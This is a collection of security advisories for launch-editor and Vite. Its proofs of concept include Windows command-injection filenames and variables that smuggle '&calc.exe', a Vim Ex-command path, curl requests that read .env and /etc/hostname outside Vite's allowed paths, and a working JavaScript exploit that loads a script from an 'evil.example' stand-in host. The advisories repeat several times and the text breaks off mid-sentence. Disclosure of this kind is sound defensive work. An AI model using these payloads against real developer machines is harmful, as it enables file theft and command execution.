### launch-editor: escapeCmdArgs() omits % escaping on Windows
[CVE-2026-112943](https://nvd.nist.gov/vuln/detail/CVE-2026-112943) /
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/advisories/GHSA-698v-4r3x-3vcv)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` did not escape `%` on Windows when passing an argument
to `cmd`. When an environment variable contained a malicious value, it
was possible that that content to be executed.

##### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing
`&` or `%`
- Either of
- An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

##### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called
directly using
[`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options)
and requires passing them as an argument of `cmd.exe`. To do so,
launch-editor escapes the arguments passed to `cmd.exe`. But
`launch-editor` did not escape `%` which is used for environment
variables.

Because `launch-editor` checks if the argument matches an existing
filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can
include the subcommand in the env variable (e.g. set ` &calc.exe ` to
`%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file
(e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call
`launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the
subcommand (e.g. `&calc.exe `), they can call `launchEditor` with
`./%CD%`

#### Severity
- CVSS Score: 6.3 / 10 (Medium)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### launch-editor: `fs.existsSync()` existence check can be bypassed on
Windows
[CVE-2026-112942](https://nvd.nist.gov/vuln/detail/CVE-2026-112942) /
[GHSA-587h-7wmj-h5pm](https://redirect.github.com/advisories/GHSA-587h-7wmj-h5pm)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a
supplied path to an editor command. On Windows, an attacker can bypass
this check with a crafted path ending in `\\..:line:column`. This
removes the requirement that the attacker be able to place a file with a
malicious filename.

Combined with the `%` escaping issue described in
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv),
this bypass can lead to OS command injection when an attacker controls
the file argument.

##### Impact

Only apps that runs on Windows is affected.

##### Details

The earlier advisory assumed that `fs.existsSync()` required an
attacker-controlled filename to exist. This advisory covers a bypass of
that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by
`launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final
path component is `..:1:1`, so it is not treated as a parent-directory
component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes
it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the
existing parent directory even though the attacker-controlled preceding
component does not exist.
4. Because the existence check passes, the crafted filename reaches the
Windows shell command.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

### launch-editor: Editor CLI flag misinterpretation causing arbitrary
command execution for some editors
[CVE-2026-112944](https://nvd.nist.gov/vuln/detail/CVE-2026-112944) /
[GHSA-r825-w8mm-5pxw](https://redirect.github.com/advisories/GHSA-r825-w8mm-5pxw)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` forwarded file paths directly to editors without
sanitization. If a path resembles a CLI flag, editors like Vim may
interpret it as a command, potentially causing unintended file
overwrites or command execution.

##### Impact

##### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the
user is using WSL

##### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

##### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The user is using WSL

##### Details

`launchEditor(file)` function passes the file name as-is to the editor
if the file with that file name exists. If the file name starts with `-`
(also `+` for Vim), the editor treats them as flags rather than
positional arguments. For example, Vim treats arguments starting with
`+` as an Ex command. As a result, an existing relative directory such
as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the
embedded Ex command.

The following editor has a potentially destructive operation exposed to
the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an
absolute path so those are not affected as long as the user is not using
WSL. For WSL, `launch-editor` converts the paths to relative paths
internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are
only affected.

#### Severity
- CVSS Score: 6.3 / 10 (Medium)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### Vite: First 4 bytes of files outside of `server.fs` setting is
exposed by `?vite-wasm-instance`
[CVE-2026-112947](https://nvd.nist.gov/vuln/detail/CVE-2026-112947) /
[GHSA-vfpm-58rq-9qcg](https://redirect.github.com/advisories/GHSA-vfpm-58rq-9qcg)

<details>
<summary>More information</summary>

#### Details
##### Summary

The first 4 bytes of files outside of `server.fs` setting can be
returned to the browser by a request containing `?vite-wasm-instance`.

##### Impact

 Only apps that match one of the following conditions are affected:

- explicitly expose the Vite dev server to the network using `--host` or
the [`server.host`](https://vite.dev/config/server-options#server-host)
option
- there's a file that has a sensitive information in **the first 4
bytes**
- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)

##### Details
Requests containing the `?vite-wasm-instance` query are handled by the
internal Wasm plugin's `load` hook. The hook removes the query and reads
the resulting path directly from disk, but the `server.fs` checks were
not applied.

After reading the file, Vite attempts to parse it as WebAssembly. When
that parse fails, Node and deno throws an error that contains the first
4 bytes of the file.

##### PoC

Create a denied file and start an affected Vite dev server:

```bash
echo 'SECRET_KEY=abc123\n' > .env
npm run dev
curl 'http://localhost:5173/.env?vite-wasm-instance'
```

This will show
```
Failed to parse WASM file "<root>/.env": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0
```

#### Severity
- CVSS Score: 6.3 / 10 (Medium)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

### Vite: Files outside `server.fs.allow` could be served when project
paths match system paths on non-Windows machine
[CVE-2026-112946](https://nvd.nist.gov/vuln/detail/CVE-2026-112946) /
[GHSA-rq7h-c2jc-7f22](https://redirect.github.com/advisories/GHSA-rq7h-c2jc-7f22)

<details>
<summary>More information</summary>

#### Details
##### Summary

The content of files outside `server.fs` setting can be returned to the
browser if the project imports a file path concatenated with the `root`.
For example, if the project references
`<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was
possible to be returned.

The content of files outside the `server.fs.allow` option can be
returned to the browser when a project imports a file whose
root-relative path matches an absolute path on the host. For example,
referencing `<project-root>/etc/hosts` could make Vite return the host's
`/etc/hosts` file.

##### Impact

Only apps that meet all of the following conditions are affected:

- explicitly expose the Vite dev server to the network (using `--host`
or the [`server.host`
option](https://vite.dev/config/server-options#server-host))
- contain an imported file whose root-relative browser URL is also the
absolute path of a readable file on the host
- The sensitive file is not matched by
[`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)
- the dev server is not running on Windows

##### Details

When Vite analyzes an in-root import, it rewrites the resolved module ID
to a browser URL such as `/etc/hostname`. In affected versions, Vite
converts that URL with `fsPathFromUrl` and adds the result to
`safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash
without resolving the URL against the project root, the project URL
`/etc/hostname` is recorded as if it were the absolute filesystem path
`/etc/hostname`.

For a later request to `/@fs/etc/hostname`, the raw-filesystem
middleware interprets `/etc/hostname` as an absolute path. The access
check applies `server.fs.deny`, then accepts paths present in
`safeModulePaths` before checking `server.fs.allow`. As a result, the
request can return the host file instead of the project file that
originally populated `safeModulePaths`.

##### PoC
The following example requires Linux with a readable `/etc/hostname`:
```bash
$ mkdir vite-safe-module-path-poc
$ cd vite-safe-module-path-poc
$ npm init -y
$ npm install vite@8.3.1
$ mkdir -p etc
$ echo 'PROJECT-DECOY\n' > etc/hostname
$ echo 'import "./etc/hostname"\n' > main.js
$ npx vite --host 127.0.0.1
```

In another terminal:
```bash
$ curl -o /dev/null -s -w '%{http_code}\n' http://127.0.0.1:5173/main.js
200
$ curl -sS -o response -w '%{http_code}\n' http://127.0.0.1:5173/@fs/etc/hostname
200
$ cmp -s response /etc/hostname && echo 'response matches host file'
response matches host file
```

- Vector String:

### Vite: Cross origin script execution through Vite custom middleware
[CVE-2026-112945](https://nvd.nist.gov/vuln/detail/CVE-2026-112945) /
[GHSA-9jrq-w75r-8gcw](https://redirect.github.com/advisories/GHSA-9jrq-w75r-8gcw)

<details>
<summary>More information</summary>

#### Details
##### Summary

When accessing a malicious site while a dev server using Vite is
running, that site was able to load scripts in a page served by the dev
server.

##### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to
`server.transformIndexHtml`: this is normally used for
`server.middlewareMode: true` or `appType: 'custom'`. The internal call
for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores
sensitive values in the location accessible or allows critical actions

##### Details

[Vite's SSR guide for
8.2.1](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131)
documents the affected setup. The application embeds Vite in middleware
mode, reads trusted HTML, and passes the browser's unchanged request URL
to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can
send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115)
use the request URL as both the transform `path` and the input to
`path.join`. The value passed to `path.join` still includes its query
text.

Chromium preserves `/../../package.json` because it follows `?` and is
therefore query text. Vite treats the same characters as filesystem path
components, so the `..` components resolve the derived filename to the
existing project `package.json`.

[The existing file branch in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232)
checks that filename with `fs.existsSync`, then preserves the `htmlPath`
supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite
in the same
file](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278)
writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser
to request the module from `evil.example` using the Vite page's scheme.
The attacker returns JavaScript for that request, and Chromium executes
it in the Vite page.

##### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

### launch-editor: escapeCmdArgs() omits % escaping on Windows
[CVE-2026-112943](https://nvd.nist.gov/vuln/detail/CVE-2026-112943) /
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/advisories/GHSA-698v-4r3x-3vcv)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` did not escape `%` on Windows when passing an argument
to `cmd`. When an environment variable contained a malicious value, it
was possible that that content to be executed.

##### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing
`&` or `%`
- Either of
- An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

##### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called
directly using
[`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options)
and requires passing them as an argument of `cmd.exe`. To do so,
launch-editor escapes the arguments passed to `cmd.exe`. But
`launch-editor` did not escape `%` which is used for environment
variables.

Because `launch-editor` checks if the argument matches an existing
filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can
include the subcommand in the env variable (e.g. set ` &calc.exe ` to
`%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file
(e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call
`launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the
subcommand (e.g. `&calc.exe `), they can call `launchEditor` with
`./%CD%`

#### Severity

- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### launch-editor: `fs.existsSync()` existence check can be bypassed on
Windows
[CVE-2026-112942](https://nvd.nist.gov/vuln/detail/CVE-2026-112942) /
[GHSA-587h-7wmj-h5pm](https://redirect.github.com/advisories/GHSA-587h-7wmj-h5pm)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a
supplied path to an editor command. On Windows, an attacker can bypass
this check with a crafted path ending in `\\..:line:column`. This
removes the requirement that the attacker be able to place a file with a
malicious filename.

Combined with the `%` escaping issue described in
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv),
this bypass can lead to OS command injection when an attacker controls
the file argument.

##### Impact

Only apps that runs on Windows is affected.

##### Details

The earlier advisory assumed that `fs.existsSync()` required an
attacker-controlled filename to exist. This advisory covers a bypass of
that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by
`launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final
path component is `..:1:1`, so it is not treated as a parent-directory
component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes
it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the
existing parent directory even though the attacker-controlled preceding
component does not exist.
4. Because the existence check passes, the crafted filename reaches the
Windows shell command.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

### launch-editor: Editor CLI flag misinterpretation causing arbitrary
command execution for some editors
[CVE-2026-112944](https://nvd.nist.gov/vuln/detail/CVE-2026-112944) /
[GHSA-r825-w8mm-5pxw](https://redirect.github.com/advisories/GHSA-r825-w8mm-5pxw)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` forwarded file paths directly to editors without
sanitization. If a path resembles a CLI flag, editors like Vim may
interpret it as a command, potentially causing unintended file
overwrites or command execution.

##### Impact

##### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the
user is using WSL

##### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

##### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The user is using WSL

##### Details

`launchEditor(file)` function passes the file name as-is to the editor
if the file with that file name exists. If the file name starts with `-`
(also `+` for Vim), the editor treats them as flags rather than
positional arguments. For example, Vim treats arguments starting with
`+` as an Ex command. As a result, an existing relative directory such
as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the
embedded Ex command.

The following editor has a potentially destructive operation exposed to
the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an
absolute path so those are not affected as long as the user is not using
WSL. For WSL, `launch-editor` converts the paths to relative paths
internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are
only affected.

#### Severity
- CVSS Score: 6.3 / 10 (Medium)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### Vite: First 4 bytes of files outside of `server.fs` setting is
exposed by `?vite-wasm-instance`
[CVE-2026-112947](https://nvd.nist.gov/vuln/detail/CVE-2026-112947) /
[GHSA-vfpm-58rq-9qcg](https://redirect.github.com/advisories/GHSA-vfpm-58rq-9qcg)

<details>
<summary>More information</summary>

#### Details
##### Summary

The first 4 bytes of files outside of `server.fs` setting can be
returned to the browser by a request containing `?vite-wasm-instance`.

##### Impact

 Only apps that match one of the following conditions are affected:

- explicitly expose the Vite dev server to the network using `--host` or
the [`server.host`](https://vite.dev/config/server-options#server-host)
option
- there's a file that has a sensitive information in **the first 4
bytes**
- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)

##### Details
Requests containing the `?vite-wasm-instance` query are handled by the
internal Wasm plugin's `load` hook. The hook removes the query and reads
the resulting path directly from disk, but the `server.fs` checks were
not applied.

After reading the file, Vite attempts to parse it as WebAssembly. When
that parse fails, Node and deno throws an error that contains the first
4 bytes of the file.

##### PoC

Create a denied file and start an affected Vite dev server:

```bash
echo 'SECRET_KEY=abc123\n' > .env
npm run dev
curl 'http://localhost:5173/.env?vite-wasm-instance'
```

This will show
```
Failed to parse WASM file "<root>/.env": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0
```

- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

### Vite: Files outside `server.fs.allow` could be served when project
paths match system paths on non-Windows machine
[CVE-2026-112946](https://nvd.nist.gov/vuln/detail/CVE-2026-112946) /
[GHSA-rq7h-c2jc-7f22](https://redirect.github.com/advisories/GHSA-rq7h-c2jc-7f22)

<details>
<summary>More information</summary>

#### Details
##### Summary

The content of files outside `server.fs` setting can be returned to the
browser if the project imports a file path concatenated with the `root`.
For example, if the project references
`<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was
possible to be returned.

The content of files outside the `server.fs.allow` option can be
returned to the browser when a project imports a file whose
root-relative path matches an absolute path on the host. For example,
referencing `<project-root>/etc/hosts` could make Vite return the host's
`/etc/hosts` file.

##### Impact

Only apps that meet all of the following conditions are affected:

- explicitly expose the Vite dev server to the network (using `--host`
or the [`server.host`
option](https://vite.dev/config/server-options#server-host))
- contain an imported file whose root-relative browser URL is also the
absolute path of a readable file on the host
- The sensitive file is not matched by
[`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)
- the dev server is not running on Windows

##### Details

When Vite analyzes an in-root import, it rewrites the resolved module ID
to a browser URL such as `/etc/hostname`. In affected versions, Vite
converts that URL with `fsPathFromUrl` and adds the result to
`safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash
without resolving the URL against the project root, the project URL
`/etc/hostname` is recorded as if it were the absolute filesystem path
`/etc/hostname`.

For a later request to `/@fs/etc/hostname`, the raw-filesystem
middleware interprets `/etc/hostname` as an absolute path. The access
check applies `server.fs.deny`, then accepts paths present in
`safeModulePaths` before checking `server.fs.allow`. As a result, the
request can return the host file instead of the project file that
originally populated `safeModulePaths`.

##### PoC
The following example requires Linux with a readable `/etc/hostname`:
```bash
$ mkdir vite-safe-module-path-poc
$ cd vite-safe-module-path-poc
$ npm init -y
$ npm install vite@8.3.1
$ mkdir -p etc
$ echo 'PROJECT-DECOY\n' > etc/hostname
$ echo 'import "./etc/hostname"\n' > main.js
$ npx vite --host 127.0.0.1
```

In another terminal:
```bash
$ curl -o /dev/null -s -w '%{http_code}\n' http://127.0.0.1:5173/main.js
200
$ curl -sS -o response -w '%{http_code}\n' http://127.0.0.1:5173/@fs/etc/hostname
200
$ cmp -s response /etc/hostname && echo 'response matches host file'
response matches host file
```

### Vite: Cross origin script execution through Vite custom middleware
[CVE-2026-112945](https://nvd.nist.gov/vuln/detail/CVE-2026-112945) /
[GHSA-9jrq-w75r-8gcw](https://redirect.github.com/advisories/GHSA-9jrq-w75r-8gcw)

<details>
<summary>More information</summary>

#### Details
##### Summary

When accessing a malicious site while a dev server using Vite is
running, that site was able to load scripts in a page served by the dev
server.

##### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to
`server.transformIndexHtml`: this is normally used for
`server.middlewareMode: true` or `appType: 'custom'`. The internal call
for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores
sensitive values in the location accessible or allows critical actions

##### Details

[Vite's SSR guide for
8.2.1](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131)
documents the affected setup. The application embeds Vite in middleware
mode, reads trusted HTML, and passes the browser's unchanged request URL
to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can
send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115)
use the request URL as both the transform `path` and the input to
`path.join`. The value passed to `path.join` still includes its query
text.

Chromium preserves `/../../package.json` because it follows `?` and is
therefore query text. Vite treats the same characters as filesystem path
components, so the `..` components resolve the derived filename to the
existing project `package.json`.

[The existing file branch in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232)
checks that filename with `fs.existsSync`, then preserves the `htmlPath`
supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite
in the same
file](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278)
writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser
to request the module from `evil.example` using the Vite page's scheme.
The attacker returns JavaScript for that request, and Chromium executes
it in the Vite page.

##### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

### launch-editor: escapeCmdArgs() omits % escaping on Windows
[CVE-2026-112943](https://nvd.nist.gov/vuln/detail/CVE-2026-112943) /
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/advisories/GHSA-698v-4r3x-3vcv)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` did not escape `%` on Windows when passing an argument
to `cmd`. When an environment variable contained a malicious value, it
was possible that that content to be executed.

##### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing
`&` or `%`
- Either of
- An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

##### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called
directly using
[`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options)
and requires passing them as an argument of `cmd.exe`. To do so,
launch-editor escapes the arguments passed to `cmd.exe`. But
`launch-editor` did not escape `%` which is used for environment
variables.

Because `launch-editor` checks if the argument matches an existing
filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can
include the subcommand in the env variable (e.g. set ` &calc.exe ` to
`%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file
(e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call
`launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the
